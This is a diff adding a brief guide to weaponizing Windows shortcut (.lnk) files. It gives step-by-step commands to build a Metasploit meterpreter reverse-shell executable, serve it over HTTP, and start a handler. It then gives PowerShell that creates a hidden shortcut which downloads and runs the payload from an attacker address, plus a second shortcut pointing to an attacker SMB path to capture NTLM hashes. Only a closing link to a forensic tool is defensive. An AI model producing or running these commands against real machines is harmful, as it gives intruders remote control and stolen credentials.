@@ -1,0 +1,40 @@
+Modern techniques to weaponize windows shortcut(lnk)file
+
+Manual Method
+
+Step-1:
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.73 LPORT=80 -f exe > install.exe
+
+Step-2:
+
+Python3 -m http.server
+
+Step-3:
+
+msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.73; set lport 80; set EXITFUNC thread; set ExitOnSession false; exploit -j"
+
+Step-4:
+
+$obj = New-object -comobject wscript.shell
+$link = $obj.createshortcut("C:\Users\victim\Desktop\malicious.lnk")
+$link.windowstyle = "7"
+$link.targetpath = "%windir%/system32/windowspowershell/v1.0/powershell.exe"
+$link.arguments = "C:\Windows\system32\windowspowershell\v1.0\powershell.exe - command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.Webclient).DownloadFile('http://192.168.1.73:8000/install.exe','install.exe');.\install.exe"
+$link.save()
+
+
+Capturing NTLM Hashes
+
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("$HOME\Desktop\.NTLM.lnk")
+$lnk.TargetPath = "\\192.168.1.73\.NTLM.xls"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "NTLM LNK File"
+$lnk.Save()
+
+
+LECmd for Analysis
+
+https://github.com/EricZimmerman/LECmd
